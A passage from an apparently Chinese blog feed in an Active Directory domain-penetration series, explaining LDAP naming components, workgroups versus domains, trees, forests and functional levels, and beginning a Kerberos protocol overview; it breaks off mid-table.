Directory其实就是目录服务数据库。目录服务数据库也是一种数据库，这种数据库相比于我们熟知的关系型数据库(比如MySQL、SQLServer、Oracle)，主要有以下几个方面的特点。</p><ol><li>它成树状结构组织数据，类似文件目录一样。</li><li>它是为查询、浏览和搜索而优化的数据库，也就是说活动目录数据库的读性能特别强，但是写性能差，而且还不支持事务处理、回滚等复杂功能。</li></ol><p>不同厂商对目录服务数据库的实现不一样，如图所示，是不同厂商对目录服务数据库的实现，可以看出Active Directory活动目录是微软对目录服务数据库的实现。</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/yu-zhong-chang-jian-ming-ci/1627197702756-e0d1f95f-4221-4066-8442-3df8640604b1.png" alt="img"></p><h1 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h1><p>既然有了目录服务数据库了，就必然需要目录访问协议去访问目录服务数据库了。而LDAP协议就是设计用来对目录服务数据库访问的协议之一。</p><p>LDAP(Lightweight Directory Access Protocol)轻量级目录访问协议，它基于X.500标准，是一个开放的、中立的、工业标准的应用协议。它可以用来查询与更新活动目录数据库，活动目录利用LDAP名称路径来描述对象在活动目录内的位置。LDAP 目录类似于文件系统目录，例如：CN&#x3D;DC01,OU&#x3D;Domain Controllers,DC&#x3D;xie,DC&#x3D;com，如果类比成文件系统的话，可被看作如下文件路径：xie.com&#x2F;Domain Controllers&#x2F;DC01，DC01代表一个对象，OU&#x3D;Domain Controllers 代表一个Domain Controllers组织单位。这句话的含义就是 DC01 这个对象处在xie.com域的 Domain Controllers 组织单元中。在LDAP中数据以树状方式组织，在树状信息中的基本数据单元是条目，而每个条目由属性组成。</p><p>例如图所示，DC01、win7、test等都是一个条目，也是一个对象，这些对象都有自身的属性。</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/yu-zhong-chang-jian-ming-ci/1644460157216-629b04f8-23bd-4570-9323-0a8a91e5630b.png" alt="img"><img src="/2022/03/07/yu-shen-tou-gong-fang/yu-zhong-chang-jian-ming-ci/1627197702559-22e8a949-d222-4a1b-9cef-52436aee5a50.png" alt="img"></p><h1 id="X-500标准定义"><a href="#X-500标准定义" class="headerlink" title="X.500标准定义"></a>X.500标准定义</h1><p>那么LDAP协议如何能快速的定位需要查询的对象呢？</p><p>完成这项工作需要定义名称空间，使其可以快速的确定每个对象的位置，下面我们来看看X.500标准中定义了哪些东西。</p><h2 id="1-DC"><a href="#1-DC" class="headerlink" title="1. DC"></a>1. DC</h2><p>DC(Domain Component) 域组件：此DC不是Domain Controllers域控，而是类似于DNS中的每个元素，DC对象表示使用DNS来定义其名称空间的LDAP树的顶部。例如域 xie.com，用 . 分开的每个单元都可以看成是一个DC域组件。</p><h2 id="2-OU"><a href="#2-OU" class="headerlink" title="2. OU"></a>2. OU</h2><p>OU(OrganizationUnit) 组织单位：在活动目录数据中定义了Organization Unit组织单位类，最多可以有四级，每级最长32个字符，可以为中文。如OU&#x3D;Domain Controllers就是一个组织单位，组织单位中包含对象、容器，还可以包含其他组织单位，并且组织单位还可以链接组策略。如图所示，可以看到Domain Controllers的objectClass属性是OrganizationUnit。</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/yu-zhong-chang-jian-ming-ci/1634485146631-d451b88d-a85d-47d1-8e05-b45f6f2f47a5.png" alt="img"></p><h2 id="3-CN"><a href="#3-CN" class="headerlink" title="3. CN"></a>3. CN</h2><p>CN(Common Name) 通用名称：对象的名称，最大长度可以到80个字符，可以为中文。例如一个用户名为张三，那么张三就是一个CN，再比如一个计算机名为 Win7，那么Win7就是CN。</p><h2 id="4-DN"><a href="#4-DN" class="headerlink" title="4. DN"></a>4. DN</h2><p>DN(Distinguished Name)可分辨名称：Active Directory中的每个对象都有完全唯一的DN，其包含对象到LDAP名称空间根的整个路径。DN 有三个属性，分别是 DC、OU、CN。DN可以表示为ldap的某个目录，也可以表示成目录中的某个对象，这个对象可以是用户、计算机等。 如：CN&#x3D;AD,OU&#x3D;Domain Controllers,DC&#x3D;xie,DC&#x3D;com 这是一个DN，它是层次结构树，从右(根)向左(叶)。表示的是 xie.com域下的 Domain Controllers 组织单元下 的 AD 对象。如图所示：</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/yu-zhong-chang-jian-ming-ci/1634481474192-4d15b71f-aeb2-4b05-8c39-92dcffa6d972.png" alt="img"></p><p>再如：CN&#x3D;Administrator,CN&#x3D;Users,DC&#x3D;xie,DC&#x3D;com 这是一个DN，表示的是xie.com域下的Users容器下的Administrator对象。如图所示：</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/yu-zhong-chang-jian-ming-ci/1634481543150-e9be5603-1fb6-4fc6-9bb1-2ccaf6543f3e.png" alt="img"></p><h2 id="5-RDN"><a href="#5-RDN" class="headerlink" title="5. RDN"></a>5. RDN</h2><p>RDN(Relative Distinguished Name) 相对可分辨名称：他与目录结构无关。比如CN&#x3D;Administrator,CN&#x3D;Users,DC&#x3D;xie,DC&#x3D;com，他的RDN为CN&#x3D;Administrator。两个对象可以具有相同的RDN，但是不能具有相同的DN。</p><h2 id="6-UPN"><a href="#6-UPN" class="headerlink" title="6. UPN"></a>6. UPN</h2><p>UPN(User Principal Name)用户辨别名称：如在域xie.com中的administrator用户，它的UPN为：<a href="mailto:&#97;&#x64;&#x6d;&#105;&#110;&#x69;&#115;&#x74;&#114;&#97;&#116;&#111;&#114;&#x40;&#120;&#x69;&#101;&#46;&#x63;&#x6f;&#x6d;">&#97;&#x64;&#x6d;&#105;&#110;&#x69;&#115;&#x74;&#114;&#97;&#116;&#111;&#114;&#x40;&#120;&#x69;&#101;&#46;&#x63;&#x6f;&#x6d;</a> 。用户登录时最好输入UPN，因为无论此用户的账号被移动到哪一个域，其UPN都不会变化，因此用户可以一直用同一个UPN来登录。如图所示，可以看到administrator的UPN。</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/yu-zhong-chang-jian-ming-ci/1634484504492-23ebf16a-54df-44fd-b081-774b19b3611a.png" alt="img"></p><h2 id="7-容器Container"><a href="#7-容器Container" class="headerlink" title="7. 容器Container"></a>7. 容器Container</h2><p>在活动目录数据中定义了容器Container类，容器是一些属性的集合。容器内可以包含其他对象，如用户、计算机等，但是容器中不能再嵌套其他容器和OU组织单位。计算机默认在CN&#x3D;Computers容器中，用户默认在CN&#x3D;Users容器中。如图所示，可以看到CN&#x3D;Computers的objectClass属性为container。</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/yu-zhong-chang-jian-ming-ci/1634485094145-90b72d68-b0c1-4165-9f5a-cb4edbe23685.png" alt="img"></p><h1 id="FQDN"><a href="#FQDN" class="headerlink" title="FQDN"></a>FQDN</h1><p>FQDN(Fully Qualified Domain Name)全限定域名：同时带有主机名和域名的名称。如域xie.com下的win7主机，其FQDN为win7.xie.com。全限定域名可以从逻辑上准确地表示出<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151">主机</a>在什么地方，也可以说全限定域名是主机名的一种完全表示形式。从全限定域名中包含的信息可以看出主机在域名树中的位置。</p><h1 id="对象Object与属性Attribute"><a href="#对象Object与属性Attribute" class="headerlink" title="对象Object与属性Attribute"></a>对象Object与属性Attribute</h1><p>AD内的资源以对象的形式存在，例如用户、计算机等都是对象，而对象是通过属性来描述其特征的，也就是对象是一些属性的集合。学过面向对象编程的话，应该就很好理解。例如要为王伟创建一个账号，则需要建立一个对象类型(Object Class)为用户(User)的对象，然后在此对象内输入王伟的姓名、登录名和地址等。其中的账号就是对象，而姓名、登录名地址等就是该对象的属性。如图所示：</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/yu-zhong-chang-jian-ming-ci/1627201021828-3e7f5c6b-deba-4344-9b13-4bca7ce209b8.png" alt="img"></p><p>非常感谢您读到现在，由于作者的水平有限，编写时间仓促，文章中难免会出现一些错误或者描述不准确的地方，恳请各位师傅们批评指正。如果你想一起学习AD域安全攻防的话，可以加入下面的知识星球一起学习交流。</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/yu-zhong-chang-jian-ming-ci/640-20230306214031031.png" alt="图片"></p><p>参考文章：<a href="https://www.ietf.org/rfc/rfc2253.txt![img](%E5%9F%9F%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/1627197703197-2010532c-92f1-43b3-9de1-9c707e8f0ef4.png)">https://www.ietf.org/rfc/rfc2253.txt![img](%E5%9F%9F%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/1627197703197-2010532c-92f1-43b3-9de1-9c707e8f0ef4.png)</a></p><p><a href="https://www.informit.com/articles/article.aspx?p=101405&amp;seqNum=7">https://www.informit.com/articles/article.aspx?p=101405&amp;seqNum=7</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工作组和域</title>
      <link href="2022/03/07/yu-shen-tou-gong-fang/gong-zuo-zu-he-yu/"/>
      <url>2022/03/07/yu-shen-tou-gong-fang/gong-zuo-zu-he-yu/</url>
      
        <content type="html"><![CDATA[<p>本文部分节选于《域渗透攻防指南》，购买请长按如下图片扫码</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/gong-zuo-zu-he-yu/image-20230306213529401.png" alt="image-20230306213529401"></p><p>域(Domain)是微软为集中管理计算机而推出的一种方式。其中所有的用户帐户，计算机，打印机和其他安全主体都在域控制器的中央数据库中注册。 在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配对该域内资源的访问权限。从Windows Server 2003开始，Active Directory是负责维护该中央数据库的Windows组件。Windows域的概念与工作组的概念形成对比，在工作组中，每台计算机都维护自己的安全主体数据库。</p><h1 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h1><p>工作组（Work Group）是局域网中的一个概念，它是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。在一个网络内，可能有上百台电脑，如果这些电脑不进行分组，都列在“网上邻居”中，电脑无规则的排列为我们访问资源带来不方便。为了解决这一问题，Windows98操作系统之后就引用了“工作组”这个概念，将不同的电脑按功能分别列入不同的组中，如软件部的电脑都列入“软件部”工作组中，网络部的电脑都列入“网络部”工作组中。你要访问某个部门的资源，就在“网上邻居”里找到那个部门的工作组名，双击就可以看到那个部门的电脑了。计算机通过工作组进行分类，使得我们访问资源更加具有层次化。默认情况下所有计算机都处在名为 WORKGROUP 的工作组中，工作组资源管理模式适合于网络中计算机不多，对管理要求不严格的情况。它的建立步骤简单，使用起来也很好上手。大部分中小公司都采取工作组的方式对资源进行权限分配和目录共享。相同组中的不同用户通过对方主机的用户名和密码可以查看对方共享的文件夹。不同组的不同用户通过对方主机的用户名和密码也可以查看对方共享的文件夹。所以工作组并不存在真正的集中管理作用 , 工作组里的所有计算机都是对等的 , 也就是没有服务器和客户机之分的。</p><p>如图所示，是工作组的拓扑图：</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/gong-zuo-zu-he-yu/1627184902255-e9e52e0a-6c0b-4c82-ae61-d0e9b80d3cea-20230307165306421.png" alt="img"></p><h2 id="1-工作组的特点"><a href="#1-工作组的特点" class="headerlink" title="1. 工作组的特点"></a>1. 工作组的特点</h2><p>工作组是一个由许多在同一物理地点，而且被相同的局域网连接起来的计算机组成的小组。相应地，一个工作组也可以是遍布一个机构的，但却被同一网络连接的计算机构成的逻辑小组。在以上两种情况下，在工作组中的计算机都可以以预定义的方式，共享文档、应用程序、电子函件和系统资源。</p><h2 id="2-工作组的优缺点"><a href="#2-工作组的优缺点" class="headerlink" title="2. 工作组的优缺点"></a>2. 工作组的优缺点</h2><h3 id="1-优点"><a href="#1-优点" class="headerlink" title="(1) 优点"></a>(1) 优点</h3><p>工作组下资源可以相当随机和灵活的分布，更方便资源共享，管理员只需要实施相当低级的维护。</p><h3 id="2-缺点"><a href="#2-缺点" class="headerlink" title="(2) 缺点"></a>(2) 缺点</h3><p>缺乏集中管理与控制的机制，没有集中的统一帐户管理，没有对资源实施更加高效率的集中管理，没有实施工作站的有效配置和安全性严密控制，缺乏单点登录，可扩展性，弹性&#x2F;灾难恢复功能以及许多安全功能。只适合小规模用户的使用。</p><h1 id="域"><a href="#域" class="headerlink" title="域"></a>域</h1><p>基于工作组以上缺点，当计算机数量比较多时，大型企业中网络规模大，需要统一的管理和集中的身份验证，并且能够给用户提供方便的搜索和使用网络资源的方式，工作组的组织形式就不合适了，于是域就出现了！域是由工作组升级而来的高级架构，可以简单的把域理解成升级版的“工作组”，相比工作组而言，它有一个更加严格的安全管理控制机制，如果你想访问域内的资源，就必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什么样的权限,还需要取决于你在该域中的用户身份。</p><p>如图所示，是域的拓扑图：</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/gong-zuo-zu-he-yu/1627196325843-e2b28348-e04a-49a6-851a-7369350d19b0-20230307165306650.png" alt="img"></p><h2 id="1-域的原理"><a href="#1-域的原理" class="headerlink" title="1. 域的原理"></a>1. 域的原理</h2><p>其实可以把域和工作组联系起来理解，在工作组上你一切的设置在本机上进行包括各种策略，用户登录也是登录在本机的，密码是放在本机的数据库来验证的。而如果你的计算机加入域的话，各种策略是域控制器统一设定，用户名和密码也是放到域控制器去验证，也就是说你的账号密码可以在同一域的任何一台计算机登录。</p><p>如果说工作组是“免费的旅店”，那么域（Domain）就是“星级的宾馆”；工作组可以随便进进出出，而域则需要严格控制。“域”的真正含义指的是服务器控制网络上的计算机能否加入的计算机组合。一提到组合，势必需要严格的控制。所以实行严格的管理对网络安全是非常必要的。在对等网模式下，任何一台电脑只要接入网络，其他机器就都可以访问共享资源，如共享上网等。尽管对等网络上的共享文件可以加访问密码，但是非常容易被破解。在由Windows 9x构成的对等网中，数据的传输是非常不安全的 。</p><p>不过在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为“域控制器（Domain Controller，简写为DC）”。</p><p>域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑接入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，他只能以对等网用户的方式访问Windows共享出来的资源，这样就在一定程度上保护了网络上的资源。</p><p>要把一台电脑加入域，仅仅使它和服务器在网上邻居中能够相互“看”到是远远不够的，必须要由网络管理员进行相应的设置，把这台电脑加入到域中。这样才能实现文件的共享，集中统一，便于管理。</p><h2 id="2-域结构"><a href="#2-域结构" class="headerlink" title="2. 域结构"></a>2. 域结构</h2><p>域结构是很复杂的，因为对于不同体量大小的企业，需求不同。域结构可以分为单域、域树、域林。</p><h3 id="1-单域"><a href="#1-单域" class="headerlink" title="(1) 单域"></a>(1) 单域</h3><p>对于小型公司来说，单域即可满足需求。所有的机器都加入到一个域中。</p><p>如图所示，是单域的拓扑图：</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/gong-zuo-zu-he-yu/1635923175229-b2916b47-fdd8-4e82-ada1-eb6fc74f9b83-20230307165306461.png" alt="img"></p><h3 id="2-域树"><a href="#2-域树" class="headerlink" title="(2) 域树"></a>(2) 域树</h3><p>域树指若干个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域，二个域之间相互访问则需要建立信任关系 (Trust Relation)。信任关系是连接在域与域之间的桥梁。父域与子域之间自动建立起了双向信任关系，并且信任关系可传递。域树内的父域与子域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p><p>如图所示域树架构，xie.com与shanghai.xie.com 和 beijing.xie.com 是父子域关系，因此他们之间自动建立起了双向信任关系。而beijing.xie.com与x.beijing.xie.com和y.beijing.xie.com、shanghai.xie.com和x.shanghai.xie.com也属于父子域关系，因此他们之间也自动建立起了双向信任关系。因此，在该域树内，所有的域都有信任关系，因此只要拥有任何一个域内的权限，那么就可以访问其他域内的资源。在域树内的所有域共享一个AD DS域服务，也就是在此域树之下只有一个AD DS域服务，不过其数据是分散存储在各个域中的，每一个域中只存储着属于该域的数据。</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/gong-zuo-zu-he-yu/1635923944174-40f26137-cdf5-46fb-9a2d-ac6b2cfeace6-20230307165306234.png" alt="img"></p><h4 id="建立域树的好处"><a href="#建立域树的好处" class="headerlink" title="建立域树的好处"></a>建立域树的好处</h4><ul><li>如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。因为在同一个域内，信息交互的条目是很多的，而且不压缩；而在域和域之间，信息交互的条目相对较少，而且压缩。</li><li>还有一个好处，就是子公司可以通过自己的域来管理自己的资源。</li><li>还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略（包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。</li></ul><h3 id="3-域林"><a href="#3-域林" class="headerlink" title="(3) 域林"></a>(3) 域林</h3><p>由一个或多个没有形成连续名称空间的域树组成，林中每个域树都有唯一的名称空间，之间不连续。域林指若干个域树通过建立信任关系组成的集合。可以通过域树之间建立的信任关系来管理和使用整个域林中的资源，从而又保持了原有域自身原有的特性。同一个林中，林根域与其他树根域自动建立双向信任关系，信任关系可传递。因此，在林中，只要拥有其中一个域内的权限，就可以访问其他林中其他域的资源。</p><p>如图所示，是域林结构：</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/gong-zuo-zu-he-yu/1635924712082-0fc6bb29-ca24-425b-a84b-6c6e6de7b022-20230307165306342.png" alt="img"></p><h2 id="3-域的功能和特点"><a href="#3-域的功能和特点" class="headerlink" title="3.域的功能和特点"></a>3.域的功能和特点</h2><ul><li>集中管理，可以集中地管理企业中成千上万分布于异地的计算机和用户。</li><li>便捷的资源访问，能够很容易地定位到域中的资源。 用户依次登录就可以访问整个网络资源，集中地身份验证。</li><li>可扩展性，既可以适用于几十台计算机的小规模网络，也可以用于跨国公司。</li></ul><h1 id="域功能级别和林功能级别"><a href="#域功能级别和林功能级别" class="headerlink" title="域功能级别和林功能级别"></a>域功能级别和林功能级别</h1><p>功能级别决定了可用的Active Directory域服务的功能。功能级别还决定了你可以在域或林中的域控制器上运行哪些 Windows Server 操作系统。 但是，功能级别不会影响你可以在已加入域或林的工作站和成员服务器上运行哪些操作系统。</p><p>部署 AD DS 时，请将域和林功能级别设置为环境可以支持的最高值。 这样一来，你就可以尽可能使用更多的 AD DS 功能。 部署新的林时，系统会提示你设置林功能级别，然后设置域功能级别。可以将域功能级别设置为高于或等于林功能级别的值，但不能将域功能级别设置为低于林功能级别的值。</p><p>随着 Windows Server 2003、2008 和 2008 R2 生命周期的结束，这些域控制器需要更新到 Windows Server 2012、2012 R2、2016 或更高版本。 因此，建议应从域中删除任何运行 Windows Server 2008 R2及更低版本的域控制器。</p><p>在 Windows Server 2008 及更高的域功能级别，分布式文件服务DFS复制用于在域控制器之间复制 SYSVOL文件夹内容。 如果在 Windows Server 2008 或更高的域功能级别创建新的域，系统会自动使用 DFS 复制来复制 SYSVOL。 如果在较低的功能级别创建域，则在复制 SYSVOL 时，需从使用 FRS 复制迁移到使用 DFS 复制。 Windows Server 2016 RS1 是最后一个包含 FRS 的 Windows Server 版本。</p><h2 id="1-域功能级别Domain-Functionality-Level"><a href="#1-域功能级别Domain-Functionality-Level" class="headerlink" title="1. 域功能级别Domain Functionality Level"></a>1. 域功能级别Domain Functionality Level</h2><p>活动目录服务的域功能级别设置只会影响到该域，不会影响到其他域。域功能级别分为以下几种，并随着Windows Server系统的发布而更新，不同的域功能级别各有不同的特点：</p><ul><li>Windows 2000：域控可以是Windows2000、Windows Server 2003及后面版本的新系统。</li><li>Windows Server 2003：域控可以是Windows Server 2003、Windows Server 2008及后面版本的新系统。</li><li>Windows Server 2008：域控可以是Windows Server 2008、Windows Server 2008R2及后面版本的新系统。</li><li>Windows Server 2008R2：域控可以是Windows Server 2008R2、Windows Server 2012及后面版本的新系统。</li><li>Windows Server 2012：域控可以是Windows Server 2012、Windows Server 2012R2及后面版本的新系统。</li><li>Windows Server 2012R2：域控可以是Windows Server 2012R2、Windows Server 2016及后面版本的新系统。</li><li>Windows Server 2016：域控可以是Windows Server 2016 和 Windows Server Standard 2012 R2及后面版本的新系统。</li></ul><p>可以看到，域控系统版本必须是大于或等于域功能级别的系统。</p><h2 id="2-林功能级别Forest-Functionality-Level"><a href="#2-林功能级别Forest-Functionality-Level" class="headerlink" title="2. 林功能级别Forest Functionality Level"></a>2. 林功能级别Forest Functionality Level</h2><p>活动目录服务的林功能级别设置会影响到该林内的所有域。林功能级别分为以下几种，并随着Windows Server系统的发布而更新，不同的林功能级别各有不同的特点：</p><ul><li>Windows 2000：域控可以是Windows2000、Windows Server 2003及后面版本的新系统。</li><li>Windows Server 2003：域控可以是Windows Server 2003、Windows Server 2008及后面版本的新系统。</li><li>Windows Server 2008：域控可以是Windows Server 2008、Windows Server 2008R2及后面版本的新系统。</li><li>Windows Server 2008R2：域控可以是Windows Server 2008R2、Windows Server 2012及后面版本的新系统。</li><li>Windows Server 2012：域控可以是Windows Server 2012、Windows Server 2012R2及后面版本的新系统。</li><li>Windows Server 2012R2：域控可以是Windows Server 2012R2、Windows Server 2016及后面版本的新系统。</li><li>Windows Server 2016：域控可以是Windows Server 2016 和 Windows Server Standard 2012 R2及后面版本的新系统。</li></ul><p>可以看到，林中的所有域控系统版本必须是大于或等于林功能级别的系统。</p><h2 id="3-查看域功能级别和林功能级别"><a href="#3-查看域功能级别和林功能级别" class="headerlink" title="3. 查看域功能级别和林功能级别"></a>3. 查看域功能级别和林功能级别</h2><p>打开Active Directory用户和计算机，找到域名xie.com，右键——&gt;属性。如图所示：</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/gong-zuo-zu-he-yu/1635926998128-ed8478b3-9a20-46d4-a293-adc4dd4c4141-20230307165306515.png" alt="img"></p><p>即可在“常规”这里看到域功能级别和林功能级别。如图所示：</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/gong-zuo-zu-he-yu/1635926971290-29bc001f-91b1-434d-bf88-d1b363b06a4a-20230307165306147.png" alt="img"></p><h2 id="4-提升域功能级别和林功能级别"><a href="#4-提升域功能级别和林功能级别" class="headerlink" title="4. 提升域功能级别和林功能级别"></a>4. 提升域功能级别和林功能级别</h2><p>打开Windows管理工具——&gt;Active Directory管理中心——&gt;点击域名即可看到右边的提升林功能级别和提升域功能级别了。如图所示：</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/gong-zuo-zu-he-yu/1635929263505-d3c8061d-9827-424d-a90d-81f180de075b-20230307165306617.png" alt="img"></p><p>点击对应按钮即可，如下，点击提升域功能级别，会提示可用的域功能级别。选中了需要提升的域功能级别后，点击确定。如图所示：</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/gong-zuo-zu-he-yu/1635929321241-975aa2de-056b-4652-ab18-e0f3d950ed0a-20230307165306498.png" alt="img"></p><p>会弹出警告，点击确定即可。如图所示：</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/gong-zuo-zu-he-yu/1635929384536-c79fb2d7-2a5e-4ce7-9a41-413d3953d5bc-20230307165306477.png" alt="img"></p><p>如图所示，成功提升了域功能级别！</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/gong-zuo-zu-he-yu/1635929422756-cf91332b-43ec-4134-8870-0b2883813656-20230307165306574.png" alt="img"></p><h1 id="工作组和域的区别"><a href="#工作组和域的区别" class="headerlink" title="工作组和域的区别"></a>工作组和域的区别</h1><p>工作组是一群计算机的集合，它仅仅是一个逻辑的集合，各自计算机还是各自管理的，你要访问其中的计算机，还是要到被访问计算机上来实现用户验证的。而域不同，域是一个有安全边界的计算机集合，在同一个域中的计算机彼此之间已经建立了信任关系，在域内访问其他机器，你只需要经过域控的许可即可。</p><p>域和工作组适用的环境不同，域一般是用在比较大的网络里，工作组则较小，在一个域中需要一台类似服务器的计算机，叫域控服务器，其他电脑如果想互相访问首先都是经过它的，但是工作组则不同，在一个工作组里的所有计算机都是对等的，也就是没有服务器和客户机之分的，但是和域一样，如果一台计算机想访问其他计算机的话首先也要找到这个组中的一台类似组控服务器，组控服务器不是固定的，以选举的方式实现，它存储着这个组的相关信息，找到这台计算机后得到组的信息然后访问。</p><p>非常感谢您读到现在，由于作者的水平有限，编写时间仓促，文章中难免会出现一些错误或者描述不准确的地方，恳请各位师傅们批评指正。如果你想一起学习AD域安全攻防的话，可以加入下面的知识星球一起学习交流。</p><p><img src="/2022/03/07/yu-shen-tou-gong-fang/gong-zuo-zu-he-yu/640-20230306214031031.png" alt="图片"></p><p>参考：<a href="https://baike.baidu.com/item/%E5%B7%A5%E4%BD%9C%E7%BB%84/5103560?fr=aladdin">https://baike.baidu.com/item/工作组/5103560?fr=aladdin</a></p><p><a href="https://baike.baidu.com/item/windows%E5%9F%9F/1492318?fr=aladdin">https://baike.baidu.com/item/windows域/1492318?fr=aladdin</a></p><p><a href="https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/active-directory-functional-levels">https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/active-directory-functional-levels</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos协议详解</title>
      <link href="2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/"/>
      <url>2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/</url>
      
        <content type="html"><![CDATA[<p>本文部分节选于《域渗透攻防指南》，购买请长按如下图片扫码</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/image-20230306213813494.png" alt="image-20230306213813494"></p><p>Kerberos协议是由麻省理工学院提出的一种网络身份验证协议，提供了一种在开放的非安全网络中认证识别用户身份信息的方法。它旨在通过使用密钥加密技术为客户端&#x2F;服务端应用程序提供强身份验证。Kerberos是西方神话中守卫地狱之门的三头犬的名字。之所以使用这个名字是因为Kerberos需要三方的共同参与才能完成一次认证流程。目前主流使用的Kerberos版本为2005年RFC4120(<a href="https://www.rfc-editor.org/rfc/rfc4120.html)%E6%A0%87%E5%87%86%E5%AE%9A%E4%B9%89%E7%9A%84KerberosV5%E7%89%88%E6%9C%AC%EF%BC%8CWindows%E3%80%81Linux%E5%92%8CMac">https://www.rfc-editor.org/rfc/rfc4120.html)标准定义的KerberosV5版本，Windows、Linux和Mac</a> OS均支持Kerberos协议。</p><h1 id="Kerberos基础"><a href="#Kerberos基础" class="headerlink" title="Kerberos基础"></a>Kerberos基础</h1><p>在Kerberos协议中，主要有以下三个角色：</p><ul><li>访问服务的客户端：Kerberos客户端是代表需要访问资源的用户进行操作的应用程序，例如打开文件、查询数据库或打印文档。每个Kerberos客户端在访问资源之前都会请求身份验证。</li><li>提供服务的服务端：域内提供服务的服务端，服务端都有一个独一的SPN。</li><li>提供认证服务的KDC(Key Distribution Center，密钥分发中心)：KDC密钥发行中心是一种网络服务，它向活动目录域内的用户和计算机提供会话票据和临时会话密钥，其服务帐户为krbtgt。KDC作为活动目录域服务ADDS的一部分运行在每个域控制器上。</li></ul><p>这里说一下krbtgt帐户，该用户是在创建活动目录时系统自动创建的一个账号，其作用是KDC密钥发行中心的服务账号，其密码是系统随机生成的，无法正常登陆主机。<img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1621604778458-48f26c9a-dfc1-4b40-be53-c3f7b5436467.gif" alt="img">在后面的域学习中，会经常和krbtgt帐户打交道，关于该帐户的其他信息会在后面的文章中详细讲解。</p><p>如图所示，可以看到krbtgt帐户的信息。</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1629032473885-b8c5407b-a4f2-4528-ab7f-20c2bfa4e535.png" alt="img"><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1625584362989-700e90a5-9b68-47cb-9209-479c338e1c25.png" alt="img"><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1621604779110-0e6a4181-3504-4ccc-b0f3-035162e43a08.gif" alt="img"></p><p>Kerberos是一种基于票据Ticket的认证方式。客户端想要访问服务端的某个服务，首先需要购买服务端认可的 <strong>ST服务票据(Service Ticket)<strong>。也就是说，客户端在访问服务之前需要先买好票，等待服务验票之后才能访问。但是这张票并不能直接购买，需要一张 <strong>TGT认购权证</strong>（Ticket Granting Ticket)。也就是说，客户端在买票之前必须先获得一张TGT认购权证。</strong>TGT认购权证</strong> 和 <strong>ST服务票据</strong> 均是由KDC(密钥分发中心)发放；因为KDC是运行在域控制器上，所以说TGT认购权证和ST服务票据均是由域控发放。</p><p>Kerberos使用TCP&#x2F;UDP 88端口进行认证，使用TCP&#x2F;UDP 464端口进行密码重设。</p><p>如图所示，可以看到域控制器AD01上开放的88和464端口。</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1640512061249-f0f5a984-d565-4681-a3c3-6af8e2153785.png" alt="img"></p><p>Kerberos中一些名词的简称及含义如表1-1所示：</p><table><thead><tr><th><strong>简称</strong></th><th><strong>全拼</strong></th></tr></thead><tbody><tr><td>DC</td><td>Domain Controller，域控</td></tr><tr><td>krbtgt</td><td>KDC密钥发行中心服务账户</td></tr><tr><td>KDC</td><td>Key Distribution 